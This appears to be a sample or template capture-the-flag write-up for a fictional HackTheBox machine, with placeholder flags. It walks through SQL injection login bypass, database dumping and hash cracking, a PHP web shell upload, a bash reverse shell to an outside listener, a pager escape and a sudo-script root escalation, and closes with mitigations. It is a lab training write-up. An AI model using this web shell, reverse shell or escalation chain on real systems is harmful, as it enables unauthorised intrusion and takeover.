---
layout: writeup
title: "Example Box"
platform: "HackTheBox"
difficulty: "Medium"
box_icon: "https://via.placeholder.com/200x200/9fef00/0d1117?text=Example"
date: 2026-01-22
tags: [web, linux, sql-injection, sudo]
---

## Box Information

- **Name:** Example Box
- **Difficulty:** Medium
- **OS:** Linux (Ubuntu 20.04)
- **IP:** 10.10.11.214
- **Points:** 30

## Enumeration

### Initial Nmap Scan

Starting with a basic nmap scan to identify open ports and services:

```bash
nmap -sC -sV -oA nmap/example 10.10.11.214
```

**Results:**
```
PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 8.2p1 Ubuntu 4ubuntu0.5
80/tcp open  http    Apache httpd 2.4.41
```

Key findings:
- SSH on port 22 (OpenSSH 8.2)
- HTTP server on port 80 (Apache 2.4.41)

### Web Enumeration

Visiting the website reveals a custom web application. Directory enumeration with gobuster:

```bash
gobuster dir -u http://10.10.11.214 -w /usr/share/wordlists/dirb/common.txt
```

Discovered endpoints:
- `/admin` - Admin login panel
- `/api` - REST API endpoint
- `/uploads` - File upload directory

### API Analysis

Testing the API endpoint reveals several interesting routes:

```bash
curl http://10.10.11.214/api/users
```

Response shows JSON with user information, potentially vulnerable to injection.

## Initial Access

### SQL Injection Discovery

Testing the login form with basic SQL injection payloads:

```sql
' OR 1=1--
```

The application is vulnerable! We can bypass authentication.

### Exploitation

Using sqlmap to extract database contents:

```bash
sqlmap -u "http://10.10.11.214/api/login" --data="username=admin&password=test" --batch --dump
```

Extracted credentials:
- Username: `admin`
- Password hash: `5f4dcc3b5aa765d61d8327deb882cf99`

Cracking with hashcat:

```bash
hashcat -m 0 hash.txt /usr/share/wordlists/rockyou.txt
```

Password: `password123`

### Getting Shell Access

After logging in as admin, we discover a file upload feature. Testing for unrestricted file upload:

```php
<?php system($_GET['cmd']); ?>
```

Upload the PHP shell and access it:

```bash
curl http://10.10.11.214/uploads/shell.php?cmd=id
```

Successful execution! Now we can get a reverse shell:

```bash
bash -c 'bash -i >& /dev/tcp/10.10.14.5/4444 0>&1'
```

## Privilege Escalation

### User Flag

Once we have a shell as `www-data`, we can read the user flag:

```bash
cat /home/john/user.txt
flag{user_flag_here}
```

### Enumeration as www-data

Checking sudo privileges:

```bash
sudo -l
```

Output:
```
User www-data may run the following commands:
    (john) NOPASSWD: /usr/bin/systemctl status *
```

Interesting! We can run systemctl as john without a password.

### Lateral Movement

The systemctl status command uses a pager (less) which can be exploited:

```bash
sudo -u john /usr/bin/systemctl status apache2
# In the less pager, type:
!/bin/bash
```

We now have a shell as `john`!

### Root Escalation

Checking john's privileges:

```bash
sudo -l
```

Output:
```
User john may run the following commands:
    (ALL) NOPASSWD: /opt/scripts/backup.sh
```

Inspecting the script:

```bash
cat /opt/scripts/backup.sh
```

The script is writable! We can modify it:

```bash
echo '#!/bin/bash' > /opt/scripts/backup.sh
echo 'cp /bin/bash /tmp/rootbash' >> /opt/scripts/backup.sh
echo 'chmod +s /tmp/rootbash' >> /opt/scripts/backup.sh
sudo /opt/scripts/backup.sh
```

### Root Flag

Execute the SUID bash:

```bash
/tmp/rootbash -p
cat /root/root.txt
flag{root_flag_here}
```

🎉 Box pwned!

## Lessons Learned

### Vulnerabilities Identified

1. **SQL Injection** - Login form didn't sanitize user input
2. **Unrestricted File Upload** - No validation on uploaded file types
3. **Weak Credentials** - Admin password was common and easily crackable
4. **Sudo Misconfiguration** - Overly permissive sudo rules
5. **Writable Script with Elevated Privileges** - Critical security flaw

### Mitigation Recommendations

- **Use prepared statements** for all database queries
- **Validate file uploads** by checking MIME types and extensions
- **Enforce strong password policies** with complexity requirements
- **Follow principle of least privilege** for sudo configurations
- **Protect system scripts** with proper file permissions

### Key Techniques

- SQL injection for authentication bypass
- Web shell upload for initial access
- Systemctl/less pager escape for lateral movement
- Writable sudo script exploitation for privilege escalation

## Tools Used

| Tool | Purpose |
|------|----------|
| nmap | Port scanning and service enumeration |
| gobuster | Directory brute-forcing |
| sqlmap | Automated SQL injection exploitation |
| hashcat | Password hash cracking |
| burpsuite | Web application testing |

## References

- [GTFOBins - systemctl](https://gtfobins.github.io/gtfobins/systemctl/)
- [OWASP SQL Injection](https://owasp.org/www-community/attacks/SQL_Injection)
- [File Upload Vulnerabilities](https://owasp.org/www-community/vulnerabilities/Unrestricted_File_Upload)

---

**Completion Date:** January 22, 2026  
**Time to Pwn:** 3 hours  
**Rating:** ⭐⭐⭐⭐ (Challenging but fair)